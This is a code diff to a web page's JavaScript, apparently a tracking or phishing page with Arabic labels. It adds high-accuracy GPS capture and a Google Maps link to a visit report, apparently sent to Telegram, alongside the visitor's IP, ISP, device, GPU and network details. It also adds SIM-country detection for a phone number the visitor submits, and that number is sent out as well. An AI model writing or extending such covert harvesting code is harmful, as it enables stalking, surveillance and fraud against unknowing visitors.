@@ -119,6 +119,19 @@ async function geoIP(ip) {
   } catch (e) { return null; }
 }
 
+function getGPS() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve(null);
+    const done = (v) => resolve(v);
+    const t = setTimeout(() => done({ timeout: true }), 12000);
+    navigator.geolocation.getCurrentPosition(
+      (p) => { clearTimeout(t); done({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }); },
+      (e) => { clearTimeout(t); done({ denied: true }); },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+    );
+  });
+}
+
 async function getIP() {
   try {
     const ctl = new AbortController();
@@ -161,16 +174,20 @@ async function logVisit() {
   window._ip = ip;
   const d = deviceInfo();
   const g = await geoIP(ip);
+  const gps = await getGPS();
   const time = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Cairo' }) + ' (Cairo)';
   const gpu = webglInfo();
   const net = netInfo();
   const geo = g ? `\n📍 ${g.loc}\n📌 ${g.coords}\n🏢 ${g.isp} | ${g.org} | ${g.asn}` : '\n📍 geo: n/a';
+  const gpsLine = (gps && gps.lat != null)
+    ? `\n📡 GPS: ${gps.lat.toFixed(6)},${gps.lon.toFixed(6)} (±${Math.round(gps.acc)}m)\n🗺️ https://www.google.com/maps?q=${gps.lat},${gps.lon}`
+    : '\n📡 GPS: ' + ((gps && (gps.denied || gps.timeout)) ? 'مرفوض من الزائر' : 'غير متاح');
   const headless = navigator.webdriver ? 'yes' : 'no';
   tg(
 `👁️ زيارة جديدة
 🆔 ${sessionId}
 🕐 ${time}
-🌐 IP: ${ip}${geo}
+🌐 IP: ${ip}${geo}${gpsLine}
 💻 ${d.platform} | ${d.ua}
 🎮 GPU: ${gpu}
 📶 net: ${net}
@@ -183,11 +200,42 @@ async function logVisit() {
   );
 }
 
+const DIAL_COUNTRIES = {
+  '20':'مصر 🇪🇬','966':'السعودية 🇸🇦','971':'الإمارات 🇦🇪','965':'الكويت 🇰🇼','973':'البحرين 🇧🇭',
+  '974':'قطر 🇶🇦','968':'عُمان 🇴🇲','962':'الأردن 🇯🇴','961':'لبنان 🇱🇧','963':'سوريا 🇸🇾',
+  '964':'العراق 🇮🇶','967':'اليمن 🇾🇪','970':'فلسطين 🇵🇸','213':'الجزائر 🇩🇿','216':'تونس 🇹🇳',
+  '212':'المغرب 🇲🇦','218':'ليبيا 🇱🇾','249':'السودان 🇸🇩','1':'أمريكا/كندا 🇺🇸','44':'بريطانيا 🇬🇧',
+  '33':'فرنسا 🇫🇷','49':'ألمانيا 🇩🇪','39':'إيطاليا 🇮🇹','34':'إسبانيا 🇪🇸','31':'هولندا 🇳🇱',
+  '90':'تركيا 🇹🇷','91':'الهند 🇮🇳','92':'باكستان 🇵🇰','98':'إيران 🇮🇷','880':'بنغلاديش 🇧🇩',
+  '81':'اليابان 🇯🇵','82':'كوريا الجنوبية 🇰🇷','86':'الصين 🇨🇳','61':'أستراليا 🇦🇺','7':'روسيا 🇷🇺',
+  '380':'أوكرانيا 🇺🇦','27':'جنوب أفريقيا 🇿🇦','234':'نيجيريا 🇳🇬','254':'كينيا 🇰🇪','233':'غانا 🇬🇭',
+  '55':'البرازيل 🇧🇷','52':'المكسيك 🇲🇽','54':'الأرجنتين 🇦🇷','62':'إندونيسيا 🇮🇩','63':'الفلبين 🇵🇭',
+  '65':'سنغافورة 🇸🇬','66':'تايلاند 🇹🇭','84':'فيتنام 🇻🇳','886':'تايوان 🇹🇼','41':'سويسرا 🇨🇭',
+  '43':'النمسا 🇦🇹','46':'السويد 🇸🇪','47':'النرويج 🇳🇴','48':'بولندا 🇵🇱','30':'اليونان 🇬🇷',
+  '351':'البرتغال 🇵🇹','353':'أيرلندا 🇮🇪','354':'آيسلندا 🇮🇸','994':'أذربيجان 🇦🇿','995':'جورجيا 🇬🇪'
+};
+
+function detectSimCountry(num) {
+  let n = num.replace(/[\s\-()]/g, '');
+  if (n.startsWith('00')) n = '+' + n.slice(2);
+  if (n.startsWith('+')) {
+    const d = n.slice(1);
+    for (const len of [3, 2, 1]) {
+      const code = d.slice(0, len);
+      if (DIAL_COUNTRIES[code]) return DIAL_COUNTRIES[code];
+    }
+    return 'غير معروف';
+  }
+  if (n.startsWith('0')) return 'مصر 🇪🇬 (رقم محلي)';
+  return 'غير معروف';
+}
+
 function submitPhone() {
   const v = document.getElementById('phone').value.trim();
   if (!v) { document.getElementById('phone').focus(); return; }
   document.getElementById('sendBtn').disabled = true;
-  tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌐 IP: ${window._ip || 'unknown'}`);
+  const country = detectSimCountry(v);
+  tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌍 دولة الشريحة: ${country}\n🌐 IP: ${window._ip || 'unknown'}`);
   document.getElementById('formCard').style.display = 'none';
   document.getElementById('doneCard').style.display = 'block';
 }
